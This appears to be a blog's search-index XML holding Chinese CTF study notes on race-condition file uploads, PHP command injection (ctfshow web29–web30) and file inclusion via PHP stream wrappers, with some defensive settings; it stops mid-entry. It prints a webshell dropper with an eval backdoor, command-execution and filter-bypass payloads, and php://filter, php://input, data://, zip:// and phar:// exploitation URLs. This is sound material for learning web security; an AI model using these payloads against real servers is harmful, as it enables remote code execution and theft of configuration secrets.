<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CTF条件竞争漏洞</title>
    <link href="/2025/06/12/CTF%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <url>/2025/06/12/CTF%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    
    <content type="html"><![CDATA[<p><strong>条件竞争</strong>指的是程序的<strong>执行结果依赖于不受控制的事件发生的顺序或时机</strong>。当多个线程或进程在没有适当同步机制的情况下，同时访问和操作共享资源（如文件、变量、数据库记录）时，就可能出现非预期的、错误的执行结果。</p><h2 id="核心原理："><a href="#核心原理：" class="headerlink" title="核心原理："></a>核心原理：</h2><ol><li><p><strong>共享资源：</strong> 存在一个多个请求&#x2F;线程&#x2F;进程都能访问的资源（例如：一个<strong>临时文件</strong>、一个状态标志、一个数据库字段、一个计数器）。</p></li><li><p><strong>非原子操作：</strong> 对共享资源的操作不是“原子性”的。这意味着完成操作需要多个步骤，在这些步骤之间可以被中断，让其他请求介入。</p></li><li><p><strong>并发访问：</strong> 攻击者能够以极高的并发度（同时或极短时间内）发送多个请求，试图让这些请求的执行流在操作共享资源的关键步骤上相互交织。</p></li><li><p><strong>非预期交织：</strong> 由于请求的执行顺序和时机不确定，攻击者精心构造的并发请求可能导致操作步骤以开发者未预料到的顺序执行。</p></li><li><p><strong>利用结果：</strong> 这种非预期的执行顺序导致程序进入一个非预期的、通常是有利于攻击者的状态（例如：绕过检查、创建非预期文件、提升权限）。</p></li></ol><hr><h2 id="文件上传-解析-执行-经典案例"><a href="#文件上传-解析-执行-经典案例" class="headerlink" title="文件上传 + 解析&#x2F;执行 (经典案例):"></a>文件上传 + 解析&#x2F;执行 (经典案例):</h2><ul><li><strong>场景：</strong> 服务器允许用户上传文件。上传后，服务器会对文件进行一些检查（如检查文件类型、内容），如果检查通过，会将文件移动到一个有执行权限的目录（如 <code>uploads/</code>）；如果检查不通过，会删除该临时文件。</li><li><strong>漏洞：</strong> 检查(<code>check</code>)和移动(<code>move</code>)是两个独立的操作，不是原子的。在<code>check</code>完成之后、<code>move</code>执行之前，存在一个非常短暂的时间窗口。</li><li><strong>攻击：</strong><ol><li>攻击者不断快速上传一个包含恶意代码（如 Webshell）的文件 <code>shell.php</code>。</li><li>服务器收到上传后，将文件保存为一个<strong>临时文件名</strong>（如 <code>/tmp/tmp_upload_12345</code>）。</li><li>服务器开始对这个临时文件进行检查。</li><li>在检查<strong>完成之后</strong>（假设检查逻辑有漏洞被绕过，或者攻击者利用速度制造混乱），但在服务器将其<strong>移动到最终目录之前</strong>（例如 <code>uploads/shell.php</code>），攻击者以极高的并发度疯狂访问这个<strong>临时文件</strong>对应的最终预期URL（如 <code>http://target/uploads/shell.php</code>）。</li><li>由于访问请求极快且大量，<strong>有可能</strong>在某个时刻，服务器刚刚完成检查认为文件合法，<strong>还没来得及移动文件</strong>，就有一个访问请求到达了Web服务器（如 Apache&#x2F;Nginx）。</li><li>Web服务器尝试去 <code>uploads/</code> 目录下寻找 <code>shell.php</code>，但此时文件还在 <code>/tmp/tmp_upload_12345</code>，所以没找到，返回404。</li><li><strong>但是！</strong> 如果攻击者的访问请求在服务器将临时文件移动到 <code>uploads/shell.php</code> <strong>之后</strong>才被Web服务器处理，那么Web服务器就能找到并执行这个 <code>shell.php</code> 文件，攻击者的恶意代码就执行成功了！</li></ol></li><li><strong>关键：</strong> 攻击者通过海量的并发访问，赌那个“移动文件刚刚完成，访问请求就到达”的时机。虽然单个请求命中的概率很低，但海量请求下总有一次会成功。成功执行后，攻击者就获得了Webshell。</li></ul><hr><h2 id="购买-兑换逻辑（有限资源或支付校验）："><a href="#购买-兑换逻辑（有限资源或支付校验）：" class="headerlink" title="购买&#x2F;兑换逻辑（有限资源或支付校验）："></a>购买&#x2F;兑换逻辑（有限资源或支付校验）：</h2><ul><li><strong>场景：</strong> 用户用积分购买商品或兑换优惠券。流程是：1) 检查用户积分是否足够； 2) 如果足够，则扣除积分； 3) 发放商品&#x2F;优惠券。</li><li><strong>漏洞：</strong> “检查积分”和“扣除积分”不是原子操作。</li><li><strong>攻击：</strong><ol><li>攻击者账户只有够买1件商品的积分。</li><li>攻击者同时发送大量购买请求（比如100个）。</li><li>服务器在处理第一个请求时，检查积分（足够） -&gt; 扣除积分（变为0） -&gt; 发放商品。</li><li>但在处理后续的99个请求时，因为它们几乎是<strong>同时</strong>到达，服务器在<strong>扣除积分之前</strong>检查积分，看到的都是<strong>原始的、足够的积分</strong>（因为第一个请求的扣除操作可能还没写入数据库，或者读到了旧缓存）。于是服务器认为积分足够，继续执行扣除和发放操作。</li><li>结果：攻击者用仅够买1件商品的积分，成功购买了100件商品。服务器积分被扣成负数，或者错误地发放了大量优惠券&#x2F;商品。</li></ol></li></ul><hr><h2 id="攻击代码（假设文件名为-shell-php）："><a href="#攻击代码（假设文件名为-shell-php）：" class="headerlink" title="攻击代码（假设文件名为 shell.php）："></a>攻击代码（假设文件名为 shell.php）：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;my.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php eval($_POST[my]);?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>代码解析</strong>：</p><ol><li><strong><code>fopen(&quot;my.php&quot;, &quot;w&quot;)</code></strong>  <ul><li>以<strong>写入模式</strong>打开当前目录下的 <code>my.php</code> 文件（不存在则创建）。</li></ul></li><li><strong><code>fputs(..., &#39;&lt;?php eval($_POST[1]);?&gt;&#39;)</code></strong>  <ul><li>向 <code>my.php</code> 写入内容：<code>&lt;?php eval($_POST[my]);?&gt;</code>  </li><li><code>eval($_POST[my])</code> 表示执行通过POST参数 <code>my</code> 传递的任意代码（例如 <code>my=system(&quot;ls&quot;)</code> 可执行系统命令）。</li></ul></li><li><strong>整体作用</strong><br><strong>当此文件被PHP解析执行时，会在当前目录生成一个恶意Webshell文件 <code>my.php</code></strong>，攻击者通过访问 <code>my.php</code> 即可控制服务器。</li></ol><hr><p><strong>shell.php执行后新建my.php文件并写入一句话木马，作用是当上传的shell.php被删后，后端还存有my.php中的后门，方便连接。</strong></p><p>接下来抓取上传shell.php的请求包，发送到<strong>Intruder</strong>爆破模块</p><p><img src="/images/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.png"></p><p>除此之外最好设置多线程重放，增加条件竞争成功的可能性。</p><p>不断访问上传的<code>shell.php</code>文件，一旦有<code>200</code>状态码，说明条件竞争成功。监控脚本启动后，开始进行无限重放</p><h2 id="验证攻击"><a href="#验证攻击" class="headerlink" title="验证攻击"></a>验证攻击</h2><p>访问 <code>http://ctf.com/uploads/my.php</code>，用HackBar发送POST请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/uploads/my.php</span> <span class="hljs-meta">HTTP/1.1</span><br>...<br>my=system(&quot;ls -al /&quot;);<br></code></pre></td></tr></table></figure><p>若返回服务器目录列表，则攻击成功。</p><hr><h3 id="防御方案（CTF出题方向）"><a href="#防御方案（CTF出题方向）" class="headerlink" title="防御方案（CTF出题方向）"></a>防御方案（CTF出题方向）</h3><ol><li><p><strong>禁用临时文件执行</strong>  </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ /tmp/</span> &#123;<br>   <span class="hljs-attribute">deny</span> all; <span class="hljs-comment"># 禁止访问/tmp目录</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>原子性移动操作</strong><br>使用 <code>rename()</code> 而非分步操作（Linux下移动是原子的）。</p></li><li><p><strong>内容二次渲染</strong><br>对图片进行压缩&#x2F;缩放，破坏嵌入的PHP代码。</p></li><li><p><strong>临时目录隔离</strong><br>将临时文件生成到不可访问的私有目录（如 <code>/var/upload_tmp/</code>）。</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/06/12/copy/"/>
    <url>/2025/06/12/copy/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2025/06/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/06/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="命令执行常见函数："><a href="#命令执行常见函数：" class="headerlink" title="命令执行常见函数："></a>命令执行常见函数：</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span>    <span class="hljs-comment">// 执行外部程序并显示输出</span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span>      <span class="hljs-comment">// 执行外部程序</span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span>  <span class="hljs-comment">// 执行外部程序并显示原始输出</span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span> <span class="hljs-comment">// 通过shell执行命令</span><br>`` ``<br>(反引号)    <span class="hljs-comment">// 执行shell命令</span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span>     <span class="hljs-comment">// 打开进程文件指针</span><br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span> <span class="hljs-comment">// 执行命令并打开文件指针</span><br></code></pre></td></tr></table></figure><h2 id="常用连接符："><a href="#常用连接符：" class="headerlink" title="常用连接符："></a>常用连接符：</h2><pre><code class="hljs">; 顺序执行多条命令(Unix)&amp; 后台执行&amp;&amp; 前一条成功才执行后一条| 管道符|| 前一条失败才执行后一条\n(换行符) 也可作为命令分隔符</code></pre><h3 id="管道符："><a href="#管道符：" class="headerlink" title="管道符："></a>管道符：</h3><p>在命令注入攻击中，管道符可以：</p><p><strong>串联多个命令</strong>：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://example.<span class="hljs-keyword">com</span>/vuln.php?<span class="hljs-built_in">input</span>=<span class="hljs-keyword">file</span>.txt|whoami<br></code></pre></td></tr></table></figure><p>尝试执行<code>file.txt</code>后接着执行<code>whoami</code></p><p><strong>过滤或处理输出</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/vuln.php?input=<span class="hljs-built_in">ls</span>|<span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><p>将<code>ls</code>命令的输出进行base64编码</p><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(isset($_GET[<span class="hljs-string">&#x27;c&#x27;</span>])</span></span>)&#123;<br></code></pre></td></tr></table></figure><p> 检查 HTTP 请求中是否包含名为 c 的参数。如果存在，执行后续代码；否则，跳到 else 语句。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>]<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>获取 HTTP 请求中的 c 参数并将其赋值给变量 $c。 （此处的$c不一定是c，只是更好理解罢了）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)&#123; <br></code></pre></td></tr></table></figure><p>使用 preg_match() 函数对 $c 变量进行正则匹配。这个正则表达式检查 $c 中是否包含不区分大小写的字符串 “flag”。如果 $c 中不包含 “flag”，则继续执行后续代码。</p><p>eval($c); 使用 eval() 函数执行 $c 变量中的代码。eval() 会将 $c 中的字符串作为 PHP 代码执行，这可能导致执行任意 PHP 代码，从而形成安全漏洞。</p><p>eval($_GET[2])：</p><ul><li><code>eval()</code> 执行字符串作为 PHP 代码。</li><li><code>$_GET[2]</code> 从 URL 参数 <code>2</code> 获取值（如 <code>&amp;2=system(...)</code>）。</li><li>这允许 <strong>动态执行任意命令</strong>，无需修改 User-Agent 反复注入。</li></ul><p>} 结束 if(!preg_match(“&#x2F;flag&#x2F;i”, $c)) 语句的判断。</p><p>}else{ 如果 $_GET[‘c’] 不存在（即 c 参数没有传递），则执行以下代码。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">highlight_file</span>(FILE); <br></code></pre></td></tr></table></figure><p>highlight_file() 函数将当前 PHP 文件的源代码高亮显示。FILE 是一个常量，它表示当前脚本的文件路径。这意味着如果没有 c 参数，脚本将显示自身的源代码。</p><p>} 结束else语句块</p><p>当程序执行到 system(‘ls’) 时，会调用系统的 Shell（如 Bash），运行 ls 命令，列出当前目录下的文件和文件夹（相当于在终端直接输入 ls）。</p><p>得到</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag.php <span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure><h4 id="cat：正序，查看-合并文件"><a href="#cat：正序，查看-合并文件" class="headerlink" title="cat：正序，查看&#x2F;合并文件"></a>cat：正序，查看&#x2F;合并文件</h4><h4 id="tac：倒序，查看日志时，优先显示最新行"><a href="#tac：倒序，查看日志时，优先显示最新行" class="headerlink" title="tac：倒序，查看日志时，优先显示最新行"></a>tac：倒序，查看日志时，优先显示最新行</h4><p>本题flag被ban，用通配符*，访问?c&#x3D;system(‘tac fla*.php’);得到flag，访问?c&#x3D;system(‘cat fla*.php’);无显示，查看源代码得到flag</p><p><strong>tac</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">flag = <span class="hljs-string">&#x27;ctfshow&#123;7b9e92b8-e4c5-4478-a9eb-e4a8862691a5&#125;&#x27;</span>;</span><br><br>*/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@<span class="hljs-built_in">link</span>: https://ctfer.com</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@email: h1xa@ctfer.com</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Last Modified <span class="hljs-keyword">time</span>: 2020-09-04 00:14:17</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Last Modified by:   h1xa</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Date:   2020-09-04 00:14:07</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Author: h1xa</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-*- coding: utf-8 -*-</span><br>/*<br><br>&lt;?php<br><br></code></pre></td></tr></table></figure><p>输出顺序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;/html&gt;       <span class="hljs-comment">// 浏览器认为文档已结束</span><br>...<br>&lt;html&gt;        <span class="hljs-comment">// 被当作普通文本</span><br><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">// 全部当作文本显示</span><br></code></pre></td></tr></table></figure><p>→ Flag直接可见</p><p><strong>cat</strong>（源代码）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:14:07</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:14:17</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;ctfshow&#123;c78ff3fc-09d6-4aa0-9b59-689b0eefebd3&#125;&#x27;</span>;<br><br></code></pre></td></tr></table></figure><p>输出顺序：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span></span><span class="language-xml">  // PHP引擎执行，可能抑制输出</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>        // 浏览器开始解析</span><br><span class="language-xml">...</span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- flag --&gt;</span> // 可能被隐藏</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p><em>!preg_match(“&#x2F;flag|system|php&#x2F;i”, $c</em></p><p>用<strong>passthru</strong>代替<strong>system</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;tac fla*.ph*&#x27;</span>);<br></code></pre></td></tr></table></figure><p>通配符：?匹配单个字符，*匹配任何数量字符，可以是0</p><p>web31</p><p><a href="https://blog.csdn.net/weixin_51213906/article/details/123010661">PHP-RCE绕过的姿势总结_rce如何绕过对system的过滤-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2025/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="文件包含函数-php"><a href="#文件包含函数-php" class="headerlink" title="文件包含函数(php):"></a>文件包含函数(php):</h2><p><strong>include($file)</strong>:包含文件，出错时仅报警告（E_WARNING），程序继续执行。</p><p><strong>require($file)</strong>:包含文件，出错时报致命错误（E_COMPILE_ERROR），程序终止。</p><p><strong>include_once($file)</strong>:与 include 类似，但会先检查文件是否已被包含，避免重复包含。</p><p><strong>require_once($file)</strong>:与 require 类似，但会先检查文件是否已被包含，避免重复包含。</p><p><strong>file_get_contents($file)</strong>:读取整个文件内容到字符串，可配合 allow_url_fopen 读取远程文件。</p><h2 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数:"></a>动态执行函数:</h2><p><strong>eval($code)</strong>:执行字符串形式的 PHP 代码（如 eval(“echo ‘hello’;”);）。</p><p><strong>system($cmd)</strong>:执行系统命令并输出结果（如 system(“ls -l”);）。</p><p><strong>exec($cmd)</strong>:执行系统命令并返回结果的最后一行（如 exec(“whoami”);）。</p><p><strong>shell_exec($cmd)</strong>:通过 shell 执行命令，返回完整输出（如 <code>ls -l</code> 或 shell_exec(“ls”);）。</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>伪协议是 PHP 提供的流封装器（Stream Wrappers），允许通过标准文件函数（如 include、file_get_contents）访问：</p><p>格式：&lt;协议&gt;:&#x2F;&#x2F;&lt;路径&gt;（如 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php）</p><p>当存在文件包含漏洞时（如 include($_GET[‘file’])），伪协议能：</p><p>1.绕过路径限制<br>（无法直接包含非脚本文件时）</p><p>2.读取源码<br>（<strong>避免被 PHP 解析执行</strong>）</p><p>3.实现远程代码执行（<strong>RCE</strong>）<br>（无需文件上传）</p><p>4.利用压缩包&#x2F;临时文件<br>（隐藏恶意代码）</p><hr><h3 id="🌟-一句话理解伪协议"><a href="#🌟-一句话理解伪协议" class="headerlink" title="🌟 一句话理解伪协议"></a>🌟 一句话理解伪协议</h3><blockquote><p><strong>伪协议 &#x3D; 给PHP的「特殊指令」</strong><br>告诉它不要简单打开文件，而是用特殊方式处理文件（比如解码&#x2F;执行代码&#x2F;读取压缩包）</p></blockquote><hr><h3 id="🧩-文件包含漏洞是什么？"><a href="#🧩-文件包含漏洞是什么？" class="headerlink" title="🧩 文件包含漏洞是什么？"></a>🧩 文件包含漏洞是什么？</h3><p>假设有段危险代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">// 比如用户访问：http://site.com/?file=header.php</span><br></code></pre></td></tr></table></figure><p>黑客如果把<code>file</code>参数改成<strong>伪协议指令</strong>，就能让PHP执行危险操作！</p><hr><h3 id="🛠️-五大伪协议详解（新手版）"><a href="#🛠️-五大伪协议详解（新手版）" class="headerlink" title="🛠️ 五大伪协议详解（新手版）"></a>🛠️ 五大伪协议详解（新手版）</h3><h4 id="1️⃣-php-filter（文件内容阅读器）"><a href="#1️⃣-php-filter（文件内容阅读器）" class="headerlink" title="1️⃣ php://filter（文件内容阅读器）"></a>1️⃣ <code>php://filter</code>（文件内容阅读器）</h4><p><strong>作用</strong>：<strong>读取文件源代码</strong>（不让PHP执行它）<br><strong>使用场景</strong>：偷看网站的配置文件（数据库密码等）<br><strong>实战示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=php://filter/convert.base64-encode/resource=config.php<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：看到<code>config.php</code>的Base64编码内容 → 解码后获得密码  </p><blockquote><p>📌 就像对快递员说：“别送包裹了！把里面的信<strong>拍照发我</strong>”（避免拆包裹触发炸弹）</p></blockquote><hr><h4 id="2️⃣-php-input（代码植入器）"><a href="#2️⃣-php-input（代码植入器）" class="headerlink" title="2️⃣ php://input（代码植入器）"></a>2️⃣ <code>php://input</code>（代码植入器）</h4><p><strong>作用</strong>：<strong>把POST请求体中的代码当作文件执行</strong><br><strong>使用场景</strong>：直接控制服务器执行命令</p><p><strong>用法</strong>：url加上php:&#x2F;&#x2F;input，同时post传参，bp抓包把post内容改成命令即可<br><strong>实战示例</strong>： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://site.com/?file=php://input&quot;</span> -d <span class="hljs-string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：服务器执行<code>ls</code>命令，列出文件  </p><blockquote><p>📌 就像把快递员打晕，<strong>把自己的炸弹塞进包裹</strong>让他配送</p></blockquote><hr><h4 id="3️⃣-data-（代码直插器）"><a href="#3️⃣-data-（代码直插器）" class="headerlink" title="3️⃣ data://（代码直插器）"></a>3️⃣ <code>data://</code>（代码直插器）</h4><p><strong>作用</strong>：<strong>直接在URL里写代码执行</strong><br><strong>使用场景</strong>：快速测试代码执行<br><strong>实战示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=data://text/plain,&lt;?php echo &#x27;HACKED!&#x27;; ?&gt;<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：页面显示 <code>HACKED!</code>  </p><blockquote><p>📌 就像打电话时说：“别收快递了！我<strong>现场给你个炸弹</strong>，立刻引爆！”</p></blockquote><hr><h4 id="4️⃣-zip-（压缩包提取器）"><a href="#4️⃣-zip-（压缩包提取器）" class="headerlink" title="4️⃣ zip://（压缩包提取器）"></a>4️⃣ <code>zip://</code>（压缩包提取器）</h4><p><strong>作用</strong>：<strong>执行压缩包里的PHP文件</strong><br><strong>使用场景</strong>：绕过文件上传检查<br><strong>实战步骤</strong>：</p><ol><li>创建 <code>shell.php</code> 内容 <code>&lt;?php system(&#39;id&#39;); ?&gt;</code></li><li>压缩成 <code>evil.zip</code></li><li>上传到服务器</li><li>触发：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=zip:///var/www/uploads/evil.zip%23shell.php<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：执行压缩包中的恶意代码  </p><blockquote><p>📌 就像寄送<strong>伪装成玩具的炸弹</strong>，让快递员从玩具箱里取出炸弹</p></blockquote><hr><h4 id="5️⃣-phar-（高级压缩提取器）"><a href="#5️⃣-phar-（高级压缩提取器）" class="headerlink" title="5️⃣ phar://（高级压缩提取器）"></a>5️⃣ <code>phar://</code>（高级压缩提取器）</h4><p>类似 <code>zip://</code>，但支持更多格式（如PHAR、TAR）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=phar:///uploads/evil.phar/internal.php<br></code></pre></td></tr></table></figure><hr><h3 id="🛡️-为什么防御难？"><a href="#🛡️-为什么防御难？" class="headerlink" title="🛡️ 为什么防御难？"></a>🛡️ 为什么防御难？</h3><p>伪协议利用了PHP的<strong>合法功能</strong>，防御需主动关闭：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 在php.ini中关闭危险设置</span><br><span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">Off</span><br><span class="hljs-attr">allow_url_fopen</span> = <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure><hr><h2 id="本地文件包含漏洞（LFI-Local-File-Inclusion）"><a href="#本地文件包含漏洞（LFI-Local-File-Inclusion）" class="headerlink" title="本地文件包含漏洞（LFI, Local File Inclusion）"></a>本地文件包含漏洞（LFI, Local File Inclusion）</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 